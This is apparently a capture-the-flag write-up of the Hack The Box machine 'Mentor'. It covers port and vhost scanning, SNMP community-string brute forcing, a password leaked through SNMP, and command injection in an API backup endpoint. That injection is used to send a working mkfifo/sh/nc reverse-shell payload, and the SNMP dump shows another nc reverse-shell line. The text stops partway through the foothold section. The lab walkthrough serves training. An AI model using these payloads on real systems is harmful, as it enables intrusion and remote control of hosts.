![mentor.png](mentor.png)

# Mentor

## Enum
```
# Nmap 7.93 scan initiated Thu Feb 16 17:22:00 2023 as: nmap -sV -sC -oN scans/initial.nmap 10.10.11.193
Nmap scan report for 10.10.11.193
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)
|_  256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 16 17:22:08 2023 -- 1 IP address (1 host up) scanned in 8.52 seconds
```

```bash
wfuzz \
  -H "Host: FUZZ.mentorquotes.htb" \
  --hc 302,400 \
  -t 50 \
  -c \
  -z file,"/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt" \
  http://mentorquotes.htb/
```
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mentorquotes.htb/
Total requests: 38267

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000142:   404        0 L      2 W        22 Ch       "api"
```

```bash
ffuf \
  -c \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u "http://mentorquotes.htb" \
  -H "Host: FUZZ.mentorquotes.htb" \
  -fc 302 \
  -mc all
```
```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://mentorquotes.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.mentorquotes.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 302
________________________________________________

api                     [Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 40ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1128 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

```bash
curl -I 10.10.11.193
HTTP/1.1 302 Found
Date: Sun, 19 Feb 2023 09:15:03 GMT
Server: Apache/2.4.52 (Ubuntu)
Location: http://mentorquotes.htb/
Content-Type: text/html; charset=iso-8859-1

curl -I http://mentorquotes.htb
HTTP/1.1 200 OK
Date: Sun, 19 Feb 2023 09:15:04 GMT
Server: Werkzeug/2.0.3 Python/3.6.9
Content-Type: text/html; charset=utf-8
Content-Length: 5506
```

![index.png](index.png)  

```bash
nmap -p- 10.10.11.193 -oN scans/nmap.allports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 18:31 GMT
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 22.46 seconds
```

```bash
dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -r -u http://mentorquotes.htb

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 56158

Output File: /home/blnkn/.dirsearch/reports/mentorquotes.htb/_23-02-16_18-28-39.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-23-02-16_18-28-39.log

Target: http://mentorquotes.htb/

[18:28:39] Starting:
[18:28:47] 403 -  281B  - /server-status

Task Completed
```

[intersting read](https://mazinahmed.net/blog/exploiting-misconfigured-apache-server-status-instances/)  about apache /server-status

This responds 403 though so we may need to bypass the auth first if we are to leverage that
[This page](https://mediatemple.net/community/products/dv/204404734/how-do-i-enable-the-server-status-page-on-my-server) is about ways that access to the /server-status page could be restricted 


## API
```bash
[20:18:58] 307 -    0B  - /admin  ->  http://api.mentorquotes.htb/admin/     (Added to queue)
[20:18:58] 422 -  186B  - /admin/
[20:18:58] 422 -  186B  - /admin/?/login
[20:18:58] 307 -    0B  - /admin/backup/  ->  http://api.mentorquotes.htb/admin/backup
[20:19:03] 405 -   31B  - /auth/login
[20:19:06] 200 -  969B  - /docs
[20:19:06] 307 -    0B  - /docs/  ->  http://api.mentorquotes.htb/docs
[20:19:15] 403 -  285B  - /server-status/     (Added to queue)
[20:19:15] 403 -  285B  - /server-status
[20:19:18] 307 -    0B  - /users  ->  http://api.mentorquotes.htb/users/     (Added to queue)
[20:19:18] 307 -    0B  - /users/login  ->  http://api.mentorquotes.htb/users/login/     (Added to queue)
[20:19:18] 307 -    0B  - /users/admin.php  ->  http://api.mentorquotes.htb/users/admin.php/     (Added to queue)
[20:19:18] 307 -    0B  - /users/login.jsp  ->  http://api.mentorquotes.htb/users/login.jsp/     (Added to queue)
[20:19:18] 307 -    0B  - /users/login.html  ->  http://api.mentorquotes.htb/users/login.html/     (Added to queue)
[20:19:18] 422 -  186B  - /users/
[20:19:18] 307 -    0B  - /users/admin  ->  http://api.mentorquotes.htb/users/admin/     (Added to queue)
[20:19:18] 307 -    0B  - /users/login.aspx  ->  http://api.mentorquotes.htb/users/login.aspx/     (Added to queue)
[20:19:18] 307 -    0B  - /users/login.php  ->  http://api.mentorquotes.htb/users/login.php/     (Added to queue)
[20:19:18] 307 -    0B  - /users/login.js  ->  http://api.mentorquotes.htb/users/login.js/     (Added to queue)
[20:19:20] Starting: admin/
[20:19:33] 405 -   31B  - /admin/backup
[20:19:33] 307 -    0B  - /admin/backup/  ->  http://api.mentorquotes.htb/admin/backup
[20:19:34] 422 -  186B  - /admin/check
[20:19:52] Starting: server-status/
[20:19:53] 404 -   22B  - /server-status/%2e%2e//google.com
[20:20:18] Starting: users/
```
```
ffuf -c \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -u "http://api.mentorquotes.htb/FUZZ" \
-mc all \
-fc 404 

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://api.mentorquotes.htb/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

admin                   [Status: 422, Size: 186, Words: 3, Lines: 1, Duration: 54ms]
docs                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 39ms]
users                   [Status: 422, Size: 186, Words: 3, Lines: 1, Duration: 33ms]
quotes                  [Status: 422, Size: 99, Words: 2, Lines: 1, Duration: 34ms]
server-status           [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 36ms]
:: Progress: [38267/38267] :: Job [1/1] :: 494 req/sec :: Duration: [0:01:10] :: Errors: 0 ::
```



Found /docs on the api vhost, this is the swagger docs for the api  
![swagger.png](swagger.png)  
  
[https://www.uvicorn.org/](https://www.uvicorn.org/)  


Creating an account
```bash
curl -sX 'POST' \
  'http://api.mentorquotes.htb/auth/signup' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "zoinks@mentorquotes.htb",
  "username": "zoinkers",
  "password": "zoinkers"
}' |\
jq "."
```
```json
{
  "id": 4,
  "email": "zoinks@mentorquotes.htb",
  "username": "zoinkers"
}
```

And login in
```bash
curl -sX 'POST' \
  'http://api.mentorquotes.htb/auth/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "zoinks@mentorquotes.htb",
  "username": "zoinkers",
  "password": "zoinkers"
}' |\
jq "."
```
```json
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InpvaW5rZXJzIiwiZW1haWwiOiJ6b2lua3NAbWVudG9ycXVvdGVzLmh0YiJ9.Bh1vCttx8SfgZ89fN-51AHW5pwzh_14bt6JnWMJ02EM"
```

And we get a JWT
![jwt.png](jwt.png)  

Tried to crack the hash of the jwt real quick, no success.
```bash
python3 jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjczNzIwMjU3fQ.ZaznY5XPzUXPe6j5wAHBVryjUzQtnZw4XNFRqyXA-2U
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjczNzIwMjU3fQ#65ace76395cfcd45cf7ba8f9c001c156bca353342d9d9c385cd151ab25c0fb65
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 ASIMD 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 DONE (2023-02-16 20:46) 0g/s 5538Kp/s 5538Kc/s 5538KC/s (Cahir!!!)..*7¡Vamos!
Session completed

john  jwt.txt --show
0 password hashes cracked, 1 left
```


users -> only admin has access, including trying to fetch my own user  
```bash
curl -siX 'GET' \
  'http://api.mentorquotes.htb/users/' \
  -H 'accept: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InpvaW5rZXJzIiwiZW1haWwiOiJ6b2lua3NAbWVudG9ycXVvdGVzLmh0YiJ9.Bh1vCttx8SfgZ89fN-51AHW5pwzh_14bt6JnWMJ02EM' \
  -H 'Content-Type: application/json'
```
```
HTTP/1.1 403 Forbidden
Date: Sun, 19 Feb 2023 11:50:42 GMT
Server: uvicorn
content-length: 54
content-type: application/json
```
```json
{"detail":"Only admin users can access this resource"}
```

quotes
```bash
curl -sX 'GET' \
  'http://api.mentorquotes.htb/quotes/' \
  -H 'accept: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InpvaW5rZXJzIiwiZW1haWwiOiJ6b2lua3NAbWVudG9ycXVvdGVzLmh0YiJ9.Bh1vCttx8SfgZ89fN-51AHW5pwzh_14bt6JnWMJ02EM' \
  -H 'Content-Type: application/json'|\
jq "."
```
```json
[
  {
    "title": " I believed I was good",
    "description": "I was so bad at studies in school. Teachers used to tell me that I should follow a different passion other than typical education. Nonetheless, I got rid of the negativity in myself and others and worked as hard as I could in my finals and college education. Now I am a paid accountant for a major brand in my country.",
    "id": 1
  },
  {
    "title": "Find your passion before its too late",
    "description": "When I was growing up, I did not really have much, sure I enjoyed my passion but did not take it seriously. When I worked in a gas station for 3 years at that point I made a decision to go back to education and get a masters degree. Now I am a senior content engineer for a reputed company",
    "id": 2
  },
  {
    "title": "Never too late",
    "description": "I was a construction worker for almost 10 years. I had to work there because I did not have any educational background to work in the academic sector. But I realized I was not getting the best of my life. So I started investing in crypto. Learned about how investing is done professionally. Soon enough I was able to give up the construction sector and start my own business. I did all this in my 60s",
    "id": 3
  },
  {
    "title": "Age is just a number",
    "description": "When I was was kid, I used to create very simple video games as a hobby. Because I loved it so much, I thought to myself that I am going to be a game developer someday. With self-motivation, I applied for a job as a game designer when I just finished school. Now I work there as a permanent video game developer. And I am really proud to be the youngest employee there.",
    "id": 4
  },
  {
    "title": "Its all worth it in the end",
    "description": "Working as a school teacher, I had a lot of responsibilities to fulfill. Even though I really loved teaching kids, the pressure was unbearable. I had 10-hour shifts at school including all the extra classes. But I did all of them to support the kids who needed my help. Now I am retired and I can not think of anything else that I would have done except this. When I see the kids I teach come and visit me telling how they enjoyed my teaching, all the hard work I put in is worth it.",
    "id": 5
  }
]
```

Only admin can create new quotes
```bash
curl -siX 'POST' \
  'http://api.mentorquotes.htb/quotes/' \
  -H 'accept: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InpvaW5rZXJzIiwiZW1haWwiOiJ6b2lua3NAbWVudG9ycXVvdGVzLmh0YiJ9.Bh1vCttx8SfgZ89fN-51AHW5pwzh_14bt6JnWMJ02EM' \
  -H 'Content-Type: application/json'\
  -d '{
  "title": "zoink",
  "description": "zoink"
}'
```
```
HTTP/1.1 403 Forbidden
Date: Sun, 19 Feb 2023 11:56:48 GMT
Server: uvicorn
content-length: 54
content-type: application/json

{"detail":"Only admin users can access this resource"}
```

And we also can't update the existing ones
```bash
curl -siX 'PUT' \
  'http://api.mentorquotes.htb/quotes/1/' \
  -H 'accept: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InpvaW5rZXJzIiwiZW1haWwiOiJ6b2lua3NAbWVudG9ycXVvdGVzLmh0YiJ9.Bh1vCttx8SfgZ89fN-51AHW5pwzh_14bt6JnWMJ02EM' \
  -H 'Content-Type: application/json'\
  -d '{
  "title": "zoink",
  "description": "zoink"
}'
```
```
HTTP/1.1 403 Forbidden
Date: Sun, 19 Feb 2023 11:59:10 GMT
Server: uvicorn
content-length: 54
content-type: application/json

{"detail":"Only admin users can access this resource"}
```

Nor delete them
```bash
curl -siX 'DELETE' \
  'http://api.mentorquotes.htb/quotes/1/' \
  -H 'accept: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InpvaW5rZXJzIiwiZW1haWwiOiJ6b2lua3NAbWVudG9ycXVvdGVzLmh0YiJ9.Bh1vCttx8SfgZ89fN-51AHW5pwzh_14bt6JnWMJ02EM' \
  -H 'Content-Type: application/json'\
  -d '{
  "title": "zoink",
  "description": "zoink"
}'
```
```
HTTP/1.1 403 Forbidden
Date: Sun, 19 Feb 2023 12:00:11 GMT
Server: uvicorn
content-length: 54
content-type: application/json

{"detail":"Only admin users can access this resource"}
```


Looks like we can't reregister an email address that was already taken
```bash
curl -sX 'POST' \
  'http://api.mentorquotes.htb/auth/signup' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "zoinkers"
}' |\
jq "."```
```json
{
  "detail": "User already exists! "
}
```

But we can reregister a username that was already taken
```bash
curl -sX 'POST' \
  'http://api.mentorquotes.htb/auth/signup' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "zarfl@mentorquotes.htb",
  "username": "james",
  "password": "zoinkers"
}' |\
jq "."
```
```json
{
  "id": 9,
  "email": "zarfl@mentorquotes.htb",
  "username": "james"
}
```

Which means we can be admin?
We get a token as james but it does give us admin access ..
```bash
curl -sX 'POST' \
  'http://api.mentorquotes.htb/auth/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "zarfl@mentorquotes.htb",
  "username": "james",
  "password": "zoinkers"
  }' |\
jq -r "."
```
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJ6YXJmbEBtZW50b3JxdW90ZXMuaHRiIn0.ku-JMFuwxawl19mDjN2rEJ1LzSjtx_08qBNzrXaMeSY
```
I got stuck about there on this one 

## SNMP Enum
Now watching ippsec's video, he found the snmp port open while doing a UDP nmap scan in the background, we could also have gotten this info quick with the `--min-rate` argument

```bash
sudo nmap -sU --min-rate 10000 10.10.11.193 -oN scans/nmap.udp
sudo nmap -sU -sV -sC -p161 10.10.11.193 -oN scans/nmap.udp-detect
sudo nmap -sU --script snmp-brute -p161 10.10.11.193
[sudo] password for blnkn:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 18:08 GMT
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.045s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute:
|_  public - Valid credentials

Nmap done: 1 IP address (1 host up) scanned in 2.20 seconds
```

From the version detection in nmap we already know that `public` community string is valid be don't get much info from that. so looking at hacktricks we try hydra and onsixtyone, and that doesn't really find anything else for some reason
```bash
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -v 10.10.11.193 snmp
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-11 18:10:41
[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task
[DATA] attacking snmp://10.10.11.193:161/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[161][snmp] host: 10.10.11.193   password: public
[STATUS] attack finished for 10.10.11.193 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-11 18:10:41
```

```bash
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt 10.10.11.193
Scanning 1 hosts, 122 communities
10.10.11.193 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
10.10.11.193 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
```

But snmpbrute finds the community string `internal`
```bash
python3 snmpbrute.py -t 10.10.11.193
   _____ _   ____  _______     ____             __
  / ___// | / /  |/  / __ \   / __ )_______  __/ /____
  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
 ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/

SNMP Bruteforce & Enumeration Script v2.0
http://www.secforce.com / nikos.vassakis <at> secforce.com
###############################################################
SNIP
Identified Community strings
        0) 10.10.11.193    internal (v2c)(RO)
        1) 10.10.11.193    public (v1)(RO)
        2) 10.10.11.193    public (v2c)(RO)
        3) 10.10.11.193    public (v1)(RO)
        4) 10.10.11.193    public (v2c)(RO)
Select Community to Enumerate [0]:^C

```

So we dump it with `snmpbulkwalk`
```bash
snmpbulkwalk -c internal -v2c 10.10.11.193|tee ~/sec/htb/machines/mentor/scans/snmp.txt
```

And foraging through all that data we can find a password provided as an argument in the cmdline
```bash
STRING: "-d -s"
HOST-RESOURCES-MIB::hrSWRunParameters.796 = STRING: "-1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0"
HOST-RESOURCES-MIB::hrSWRunParameters.899 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
HOST-RESOURCES-MIB::hrSWRunParameters.904 = STRING: "--foreground"
HOST-RESOURCES-MIB::hrSWRunParameters.905 = STRING: "/usr/bin/networkd-dispatcher --run-startup-triggers"
HOST-RESOURCES-MIB::hrSWRunParameters.906 = STRING: "--no-debug"
HOST-RESOURCES-MIB::hrSWRunParameters.907 = STRING: "-n -iNONE"
HOST-RESOURCES-MIB::hrSWRunParameters.1217 = STRING: "-f -P"
HOST-RESOURCES-MIB::hrSWRunParameters.1219 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f"
HOST-RESOURCES-MIB::hrSWRunParameters.1262 = STRING: "-o -p -- \\u --noclear tty1 linux"
HOST-RESOURCES-MIB::hrSWRunParameters.1277 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1278 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1279 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1341 = STRING: "-H fd:// --containerd=/run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1690 = STRING: "/usr/local/bin/login.sh"
HOST-RESOURCES-MIB::hrSWRunParameters.1755 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432"
HOST-RESOURCES-MIB::hrSWRunParameters.1771 = STRING: "-namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1863 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000"
HOST-RESOURCES-MIB::hrSWRunParameters.1877 = STRING: "-namespace moby -id 03cde9245f87bb8dee1ad649db30a6789d0ad8264d9be26328ccbc777608f19f -address /run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1898 = STRING: "-m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000"
HOST-RESOURCES-MIB::hrSWRunParameters.1983 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80"
HOST-RESOURCES-MIB::hrSWRunParameters.2002 = STRING: "-namespace moby -id 8ec56cb27181c04f61e25615aad76f3aab86d1ed088832119c8861d8f6e75164 -address /run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.2022 = STRING: "main.py"
HOST-RESOURCES-MIB::hrSWRunParameters.2051 = STRING: "-c from multiprocessing.semaphore_tracker import main;main(4)"
HOST-RESOURCES-MIB::hrSWRunParameters.2052 = STRING: "-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork"
HOST-RESOURCES-MIB::hrSWRunParameters.2119 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
HOST-RESOURCES-MIB::hrSWRunParameters.22614 = STRING: "-c tar -c -f /etc/passwd;rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 10.10.16.9 4242 > f;/app_backkup.tar /app/ &"
HOST-RESOURCES-MIB::hrSWRunParameters.22618 = STRING: "f"
HOST-RESOURCES-MIB::hrSWRunParameters.22619 = STRING: "-i"
HOST-RESOURCES-MIB::hrSWRunParameters.22620 = STRING: "10.10.16.9 4242"
HOST-RESOURCES-MIB::hrSWRunParameters.22931 = STRING: "models.py"
```

## Command injection in the API
This password doesn't work either with usernames james or admin as ssh password, but if we come back to our api, we can now login as james with that password.
```bash
curl -sX 'POST' \
  'http://api.mentorquotes.htb/auth/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}' |\
jq "."
```
```
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
```

So we now have admin privileges on the api 
```bash
curl -sX 'GET' \
  'http://api.mentorquotes.htb/users/' \
  -H 'accept: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
  -H 'Content-Type: application/json' |\
jq "."
```
```json
[
  {
    "id": 1,
    "email": "james@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 2,
    "email": "svc@mentorquotes.htb",
    "username": "service_acc"
  }
]
```

And we can leverage that with the `undocumented` endpoint `backup`, we have found that earlyer with our dirsearch scan. After a little trial and error it's easy to figure out that the enpoint only accepts the POST method and it tells us the `loc` parameter is missing, so we add it, now it says `path` is missing, so again we add it, and finally get a successfull response. 
```bash
curl -sX 'POST' \
  'http://api.mentorquotes.htb/admin/backup' \
  -H 'accept: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
  -H 'Content-Type: application/json'\
  -d '{"loc": "x", "path": "xx"}'|jq .
```
```json
{
  "INFO": "Done!"
}
```

So it sounds like it could be doing someting like that in the backend
```bash
tar -cvzf <path>.tar.gz <loc>
```

Can we do some command injection?
```bash
tar -cvzf x;sleep 1;.tar.gz xx
```

Yep this works, and returns after 1 sec 
```bash
curl -sX 'POST' \
  'http://api.mentorquotes.htb/admin/backup' \
  -H 'accept: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
  -H 'Content-Type: application/json'\
  -d '{"loc": "x;sleep 1;", "path": "xx;sleep 1;"}'|jq .
```
```json
{
  "INFO": "Done!"
}
```

## The TCPDump tangent
Since we're shamelessly following ipssec's video at this stage, i'm also trying the tcpdump listerner to catch ICMP packets, taking notes as this isn't the first time I see this, and I think it's pretty cool.
```bash
curl -sX 'POST' \
  'http://api.mentorquotes.htb/admin/backup' \
  -H 'accept: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
  -H 'Content-Type: application/json'\
  -d '{"loc": "x", "path": "xx;ping -c2 10.10.14.130;"}'|jq .

```
```json
{
  "INFO": "Done!"
}
```
```bash
sudo tcpdump -i tun0 -v icmp
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:42:59.673088 IP (tos 0x0, ttl 62, id 38684, offset 0, flags [DF], proto ICMP (1), length 84)
    mentorquotes.htb > 10.10.14.130: ICMP echo request, id 4096, seq 0, length 64
18:42:59.673178 IP (tos 0x0, ttl 64, id 26189, offset 0, flags [none], proto ICMP (1), length 84)
    10.10.14.130 > mentorquotes.htb: ICMP echo reply, id 4096, seq 0, length 64
```

## Foothold
So we have command execution, we can just do a revshell now, tried a few with bash, didn't work.
We'll realize later that's because we're in an Alpine container and as a result we only have sh.
```bash
curl -sX 'POST' \
  'http://api.mentorquotes.htb/admin/backup' \
  -H 'accept: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
  -H 'Content-Type: application/json'\
  -d '{"loc": "x;sleep 1;", "path": "xx;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.130 4242 >/tmp/f;"}'|jq .
```
```
rlwrap nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.130] from (UNKNOWN) [10.10.11.193] 37345
sh: can't access tty; job control turned off
/app # pwd
/app
/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/app # ls -la
total 24
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 .
drwxr-xr-x    1 root     root          4096 Mar 11 18:51 ..
-rw-r--r--    1 root     root          1024 Jun 12  2022 .Dockerfile.swp
-rw-r--r--    1 root     root           522 Nov  3 12:58 Dockerfile
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 app
-rw-r--r--    1 root     root           672 Jun  4  2022 requirements.txt
/app # cd
/home/svc # ls -la
total 28
drwxr-x---    4 1001     1001          4096 Nov 11 17:41 .
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 ..
lrwxrwxrwx    1 root     root             9 Nov 10 14:28 .bash_history -> /dev/null
-rw-r--r--    1 1001     1001          3771 Jun  7  2022 .bashrc
drwx------    3 1001     1001          4096 Jun 12  2022 .cache
drwxrwxr-x    5 1001     1001          4096 Jun 12  2022 .local
-rw-r--r--    1 1001     1001           807 Jun  7  2022 .profile
-rw-r-----    1 root     1001            33 Mar 11 18:51 user.txt
/home/svc # cat /etc/*release
3.10.3
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.10.3
PRETTY_NAME="Alpine Linux v3.10"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://bugs.alpinelinux.org/"
/home/svc #
```

Improved exploit with nohup and backgrounding the process and finally escaping the rest of the command with a comment, because we can't do ; and & at the same time.  
All those tricks come from the ippsec video
```bash
